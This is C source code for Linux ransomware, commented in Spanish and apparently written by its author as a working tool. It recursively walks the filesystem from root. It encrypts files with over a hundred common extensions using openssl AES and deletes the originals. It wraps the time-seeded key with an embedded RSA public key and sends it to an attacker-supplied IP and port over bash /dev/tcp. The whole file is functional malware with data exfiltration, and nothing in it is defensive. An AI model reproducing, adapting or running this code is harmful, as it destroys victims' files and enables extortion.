
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>


char path[100000]="/";
char extension[][10] = {".jpg",".jpeg",".raw",".tif",".gif",".png",".bmp",".3dm",".max",".accdb",".db",".dbf",".mdb",".pdb",".sql",".dwg",".dxf",".c",".cpp",".cs",".h",".php",".asp",".rb",".java",".jar",".class",".py",".js",".aaf",".aep",".aepx",".plb",".prel",".prproj",".aet",".ppj",".psd",".indd",".indl",".indt",".indb",".inx",".idml",".pmd",".xqx",".xqx",".ai",".eps",".ps",".svg",".swf",".fla",".as3",".as",".txt",".doc",".dot",".docx",".docm",".dotx",".dotm",".docb",".rtf",".wpd",".wps",".msg",".pdf",".xls",".xlt",".xlm",".xlsx",".xlsm",".xltx",".xltm",".xlsb",".xla",".xlam",".xll",".xlw",".ppt",".pot",".pps",".pptx",".pptm",".potx",".potm",".ppam",".ppsx",".ppsm",".sldx",".sldm",".wav",".mp3",".aif",".iff",".m3u",".m4u",".mid",".mpa",".wma",".ra",".avi",".mov",".mp4",".3gp",".mpeg",".3g2",".asf",".asx",".flv",".mpg",".wmv",".vob",".m3u8",".mkv",".dat",".csv",".efx",".sdf",".vcf",".xml",".ses",".rar",".zip",".7zip"}; //agregar como lista de extensiones
int ext_len = sizeof(extension)/(sizeof(char)*10);
/*
".jpg",".jpeg",".raw",".tif",".gif",".png",".bmp",".3dm",".max",".accdb",".db",".dbf",".mdb",".pdb",".sql",".dwg",".dxf",".c",".cpp",".cs",".h",".php",".asp",".rb",".java",".jar",".class",".py",".js",".aaf",".aep",".aepx",".plb",".prel",".prproj",".aet",".ppj",".psd",".indd",".indl",".indt",".indb",".inx",".idml",".pmd",".xqx",".xqx",".ai",".eps",".ps",".svg",".swf",".fla",".as3",".as",".txt",".doc",".dot",".docx",".docm",".dotx",".dotm",".docb",".rtf",".wpd",".wps",".msg",".pdf",".xls",".xlt",".xlm",".xlsx",".xlsm",".xltx",".xltm",".xlsb",".xla",".xlam",".xll",".xlw",".ppt",".pot",".pps",".pptx",".pptm",".potx",".potm",".ppam",".ppsx",".ppsm",".sldx",".sldm",".wav",".mp3",".aif",".iff",".m3u",".m4u",".mid",".mpa",".wma",".ra",".avi",".mov",".mp4",".3gp",".mpeg","."3g2",".asf",".asx",".flv",".mpg",".wmv",".vob",".m3u8",".mkv",".dat",".csv",".efx",".sdf",".vcf",".xml",".ses",".rar",".zip",".7zip"
*/

//--------------------------------------------
char * gen_aes(){
    static char aes[48];
    srand(time(NULL)); //Tener cuidado que con la semilla pueden calcular la key
    char dic[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for(int i=0; i<48; i++){
        aes[i] = dic[rand () % strlen(dic)];
    }
    //printf("%s\n",aes);
    return aes;
}

void end_file(char aes[]){
    //echo "texto ctm" | openssl rsautl -encrypt -pubin -inkey clave.pub.pem -out enviame.enc
    char command[100000]="echo -n '";
    strcat(command,aes);
    strcat(command,"' | openssl rsautl -encrypt -pubin -inkey clave.pub.pem -out enviame.enc");
    //printf("%s\n",command);
    system(command);
}

void send_file(char ip[], char port[]){
    //exec execv (vamos sin bashito)
    char command[100000] = "bash -c 'base64 enviame.enc > /dev/tcp/";
    strcat(command,ip);
    strcat(command,"/");
    strcat(command,port);
    strcat(command,"'");
    //printf("%s",command);
    system(command);
}

void key_pub(int i){
    if(i == 1){
        //Creamos la llave publica //nativo por si el pc no tiene el comando base64
        system("echo 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQ0lqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FnOEFNSUlDQ2dLQ0FnRUEyaU03cUhHdDlGUUwxSGVZbGRzRQpud2ZtQWhsYzNiZm1SYXhWQTA3WXJqZENWVFh5aGpLcTVjbjhpRThuRFdVRHdiclpLbkxJZTYzRzdMcFQ2TDhsCm9xQ2dIaWVFUFIzWnFYenVManIwWkNrVTljRkU4RTFvSlY3YmZMRW90SDVpWnBldVkwNkMxR3dXaTkrS2RyZjkKUjBKM2RwbGIxQkl4cnNBeGRpcStuVUhWQWVVSXBEZWZ2YWRKc0s5cGpVcGZ2c1VIN08yMTRTOENBekgxaXJ4WQplalFscXJHZFdYbHpiZVR6bG0rQlJsOVZveEwwNGxpb0tEanc1YzBkcFlyUC9NRnlzWnF5elpkcDNjdEx3UllOCjgxOCtoZUhnR1lvYWtXVFVPcWxoUVhaaCtPNm1lY3lhNWo2QmF4Y1hTTDdJYWNRYzUrUTlHS3psbTdGbE5wZ2EKUFFIS2JhU2JFaWZwQ0k2SXg0cC9sNDRaSlRwcTlWa3JVclpORGJTc1VGQ0lhVmFGa1h0R3pyRmNaTFZ1c0xhcQorWTlUVUYxdUt6SzRVeEFDK2hVOTJPK1p4VmhHVGcxWjk5Qmo0dmJLdkRDcjFZSFJKZWl6aXd3ZWhiNGkweGlhCks4ZnQzNWtyUWwrU2xrdDU3TXVXcmVmZGJ0RDBxdnZ3MHU2SCs2dGh0R1p2MmM0dmcrTVNLMnBkZFBXQzhJUGkKa1NISk94UjlCM1RtdzljT0JoTXZLb1VTSEhsNFJmem53N3Q0aHprMkZML0hUcGVlNHZQNjI2Q1ZMcUR5Y1lCZQp5TW85dERTQ0p6RTEzeXlkVFBOUzVTem1hdk5UbEFvTTZWS0o4VzdlcVhsb0o3VEdUdEplanpTSkRHQTIxZEd4CjhDUEZ1WXZ2MzAyVm5CN2QvdXJEYkg4Q0F3RUFBUT09Ci0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=' | base64 -d > clave.pub.pem");
    }else if(i == 0){
        //Eliminamos la llave publica
        system("rm clave.pub.pem");
    }
}
//--------------------------------------------

void cifrar(char path[], char file[], char passwd[]){
  char command[100000]="(openssl enc -aes-256-cbc -pass pass:";
  strcat(command,passwd);
  strcat(command," -in ");
  strcat(command,path);
  strcat(command,"/");
  strcat(command,file);
  strcat(command," -out ");
  strcat(command,path);
  strcat(command,"/");
  strcat(command,file);
  strcat(command,".ntd 2>/dev/null; rm ");
  strcat(command,path);
  strcat(command,"/");
  strcat(command,file);
  strcat(command," 2>/dev/null)&");  

  //(openssl enc -aes-256-cbc -pass pass:1234 -in plain.txt -out plain.txt.ntd 2>/dev/null; rm plain.txt 2>/dev/null)&
  system(command);
}

int find_ext(char file[]){
    for(int i=0; i<ext_len; i++){
        if(strstr(file,extension[i]) != NULL){ // que no tenga .ntd (revisar doc strstr)
            return 1;
        }
    }
    return 0;
}

int list_files(int n, int h, char key[])
{
    /*debug
    if(h == 3){
        printf("%s\n",path);
    }*/
    DIR *d;
    struct dirent *dir;
    d = opendir(path);
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            if(strcmp(dir->d_name, ".") && strcmp(dir->d_name, "..")){
                if(dir->d_type == DT_DIR){
                    strcat(path,"/");
                    strcat(path,dir->d_name);
                    list_files(strlen(path),h+1,key);
                    path[n] = 0;
                }else if(dir->d_type == DT_REG){
                    if(find_ext(dir->d_name)){
                        //printf("%s/%s -> Filesito\n", path,dir->d_name);
                        cifrar(path,dir->d_name,key);
                    }
                }
            }
        }
        closedir(d);
    }
    return(0);
}

int create_flag(const char* filename){
    int fd = open(filename, O_CREAT | O_WRONLY, 0400);
    dprintf(fd, "1");
    close(fd);
    return 0;
}

void main(int argc, char * argv[]){
    if(argc != 3){
        fprintf(stderr,"No po\n");
        exit(69);
    }
    //Create flag
    create_flag("root/flag.ntd");
    //Key AES para el cifrado de ficheros
    char key[48];
    strcat(key,gen_aes());
    //Key RSA Pub
    key_pub(1);
    //Creando fichero con informacion confidencial para enviar al dueño del ransomware
    end_file(key);
    //Enviando fichero confidencial
    send_file(argv[1],argv[2]);
    //Del RSA Pub
    key_pub(0);
    //Listar ficheros y cifrar
    list_files(strlen(path),0,key);
}